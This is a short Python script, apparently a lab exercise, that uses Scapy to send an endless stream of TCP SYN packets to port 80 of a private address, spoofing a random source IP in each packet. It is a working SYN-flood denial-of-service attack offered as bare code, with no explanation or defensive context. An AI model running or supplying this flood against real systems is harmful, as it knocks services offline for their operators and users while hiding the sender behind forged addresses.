from scapy.all import *
import random
import time

target_ip = "192.168.64.107" 
target_port = 80

while True:
    ip = IP(dst=target_ip, src=f"192.168.1.{random.randint(1,254)}")
    tcp = TCP(sport=80, dport=target_port, flags="S")
    pkt = ip / tcp
    send(pkt, verbose=0)
    time.sleep(0.005) 
